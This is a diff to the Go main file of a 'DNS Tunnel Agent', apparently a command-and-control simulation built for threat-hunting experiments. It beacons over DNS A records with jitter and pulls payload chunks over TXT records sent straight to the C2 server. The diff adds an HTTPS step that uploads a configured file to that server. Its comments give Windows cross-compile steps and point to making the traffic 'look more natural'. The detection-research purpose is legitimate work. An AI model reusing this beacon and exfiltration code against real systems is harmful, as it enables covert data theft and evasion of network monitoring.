@@ -7,18 +7,19 @@
 //  4. After TXT complete: uploads file via HTTPS
 //  5. Returns to beaconing
 //
+// ROUTING BEHAVIOR:
+//   - A record beacons: Go through local resolver (when DirectMode=false)
+//   - TXT record transfer: ALWAYS direct to C2 (bypass caching)
+//
 // USAGE:
 //  1. Configure variables below
 //  2. Cross-compile for Windows: GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
 //  3. Run on Windows target
-//
-// NOTE: In production (DirectMode=false), the agent queries the LOCAL DNS resolver,
-// which then performs recursive resolution to reach the C2.
-// For testing (DirectMode=true), queries go directly to the C2 server.
 package main
 
 import (
 	"log"
+	"motd_joker_screenmate/internal/https"
 	"time"
 
 	"motd_joker_screenmate/internal/dns"
@@ -29,29 +30,30 @@ import (
 // CONFIGURATION - Modify these variables for your environment
 // =============================================================================
 
-// =============================================================================
-// CONFIGURATION - Modify these variables for your environment
-// =============================================================================
-
 var (
 	// Domain is the base domain for DNS queries.
 	Domain = "timeserversync.com"
 
 	// C2ServerIP is the IP address of the C2 server.
-	// Used for HTTPS connection AND for DNS queries when DirectMode=true.
+	// Used for:
+	//   - HTTPS connection (Phase 5)
+	//   - TXT queries (always direct)
+	//   - A queries (when DirectMode=true)
 	C2ServerIP = "127.0.0.1"
 
-	// DirectMode controls DNS query routing:
-	//   true  = Query C2 server directly (for testing)
-	//   false = Query local resolver (for realistic traffic/experiment)
+	// DirectMode controls A record query routing:
+	//   true  = A queries go directly to C2 (for testing)
+	//   false = A queries go through local resolver (for experiment)
+	//
+	// NOTE: TXT queries ALWAYS go direct to C2 regardless of this setting.
 	DirectMode = true
 
-	// DNSResolver is the local DNS resolver to query when DirectMode=false.
+	// DNSResolver is the local DNS resolver for A queries when DirectMode=false.
 	// Examples: "192.168.1.1:53", "10.0.0.1:53", "8.8.8.8:53"
 	DNSResolver = "8.8.8.8:53"
 
 	// BeaconInterval is the base time between A record check-ins (seconds).
-	BeaconInterval = 10 // 5 minutes
+	BeaconInterval = 10
 
 	// Jitter is the ± randomization applied to BeaconInterval (seconds).
 	// Actual interval will be BeaconInterval ± Jitter (4-6 minutes).
@@ -62,7 +64,7 @@ var (
 
 	// ExfilFilePath is the file to upload to the C2 after TXT transfer.
 	// Should be ~200MB for realistic exfiltration traffic.
-	ExfilFilePath = `C:\Users\Public\largefile.bin`
+	ExfilFilePath = `./exfil/data.zip`
 
 	// TXTQueryDelayMs is the delay between TXT queries (milliseconds).
 	// A small delay makes the traffic look more natural.
@@ -73,23 +75,31 @@ func main() {
 	log.Println("=== DNS Tunnel Agent ===")
 	log.Printf("Domain: %s", Domain)
 	log.Printf("C2 Server: %s", C2ServerIP)
-	log.Printf("Direct Mode: %v", DirectMode)
+	log.Printf("Direct Mode (for A queries): %v", DirectMode)
 
-	// Determine which DNS server to query
-	var dnsTarget string
+	// Determine target for A queries
+	var aTarget string
 	if DirectMode {
-		dnsTarget = C2ServerIP + ":53"
-		log.Printf("DNS Target: %s (DIRECT TO C2)", dnsTarget)
+		aTarget = C2ServerIP + ":53"
+		log.Printf("A Query Target: %s (DIRECT TO C2)", aTarget)
 	} else {
-		dnsTarget = DNSResolver
-		log.Printf("DNS Target: %s (via local resolver)", dnsTarget)
+		aTarget = DNSResolver
+		log.Printf("A Query Target: %s (via local resolver)", aTarget)
 	}
 
+	// TXT queries ALWAYS go direct to C2
+	txtTarget := C2ServerIP + ":53"
+	log.Printf("TXT Query Target: %s (ALWAYS DIRECT)", txtTarget)
+
+	log.Printf("HTTPS Target: %s:%d", C2ServerIP, HTTPSPort)
 	log.Printf("Beacon interval: %d ± %d seconds", BeaconInterval, Jitter)
 	log.Printf("Exfil file: %s", ExfilFilePath)
 
-	// Create DNS client
-	dnsClient := dns.NewClient(dnsTarget, Domain)
+	// Create DNS client with separate targets for A and TXT
+	dnsClient := dns.NewClient(aTarget, txtTarget, Domain)
+
+	// Create HTTPS client for file uploads
+	httpsClient := https.NewClient(C2ServerIP, HTTPSPort)
 
 	// Main beacon loop
 	log.Println("[AGENT] Starting beacon loop...")
@@ -108,12 +118,14 @@ func main() {
 		if isJob {
 			log.Println("[BEACON] JOB RECEIVED! Switching to TXT transfer mode...")
 
-			// Perform TXT transfer
+			// Perform TXT transfer (direct to C2)
 			receiveTXTPayload(dnsClient)
 
-			// TODO: Phase 5 - After TXT complete, upload file via HTTPS
-			log.Println("[AGENT] TXT transfer complete. HTTPS upload not yet implemented.")
-			log.Println("[AGENT] Resuming normal beacon cycle...")
+			// Perform HTTPS upload
+			log.Println("[AGENT] TXT transfer complete. Starting HTTPS exfiltration...")
+			performHTTPSExfil(httpsClient)
+
+			log.Println("[AGENT] Exfiltration complete. Resuming normal beacon cycle...")
 		} else {
 			log.Println("[BEACON] No job pending, sleeping...")
 		}
@@ -127,25 +139,24 @@ func main() {
 // Each TXT record contains a sequence number + base64 encoded chunk.
 // An empty TXT record signals the end of the transfer.
 //
-// NOTE: We don't actually reassemble the payload in this simulation.
-// The goal is to generate the traffic pattern (many TXT queries).
-// For a real threat hunt, seeing hundreds of TXT queries in quick
-// succession is the "smoking gun" indicator.
+// NOTE: TXT queries go DIRECTLY to C2 server, bypassing the local resolver.
+// This avoids caching issues since we reuse the same 20 subdomains.
+//
+// The detection signal is the volume of TXT queries, not the routing path.
 func receiveTXTPayload(client *dns.Client) {
-	log.Println("[TXT] Starting payload transfer...")
+	log.Println("[TXT] Starting payload transfer (direct to C2)...")
 
 	chunksReceived := 0
 	totalBytes := 0
 	startTime := time.Now()
 
 	for {
-		// Query for next TXT record
+		// Query for next TXT record (goes direct to C2)
 		txtValue, isEmpty, err := client.QueryTXT()
 
 		if err != nil {
 			log.Printf("[TXT] Query error: %v", err)
 			// Continue anyway - we don't care about packet loss for this simulation
-			// In a real scenario, you might implement retry logic
 			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
 			continue
 		}
@@ -162,7 +173,6 @@ func receiveTXTPayload(client *dns.Client) {
 		seqNum, payload, err := protocol.ParseChunk(txtValue)
 		if err != nil {
 			log.Printf("[TXT] Failed to parse chunk: %v", err)
-			// Continue anyway
 			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
 			continue
 		}
@@ -177,9 +187,30 @@ func receiveTXTPayload(client *dns.Client) {
 		}
 
 		// Small delay between queries to look more natural
-		// Also prevents hammering the DNS server too hard
 		time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
 	}
+}
+
+// performHTTPSExfil uploads the configured file to the C2 server.
+// This simulates data exfiltration after the DNS channel "upgrades" to HTTPS.
+func performHTTPSExfil(client *https.Client) {
+	log.Printf("[HTTPS] Preparing to upload: %s", ExfilFilePath)
+
+	// Check if C2 is reachable
+	if err := client.CheckConnection(); err != nil {
+		log.Printf("[HTTPS] C2 server not reachable: %v", err)
+		log.Println("[HTTPS] Skipping exfiltration, will retry next job cycle.")
+		return
+	}
+
+	// Upload the file
+	if err := client.UploadFile(ExfilFilePath); err != nil {
+		log.Printf("[HTTPS] Upload failed: %v", err)
+		log.Println("[HTTPS] Exfiltration failed, will retry next job cycle.")
+		return
+	}
+
+	log.Println("[HTTPS] Exfiltration successful!")
 }
 
 // sleepWithJitter pauses execution for BeaconInterval ± Jitter seconds.
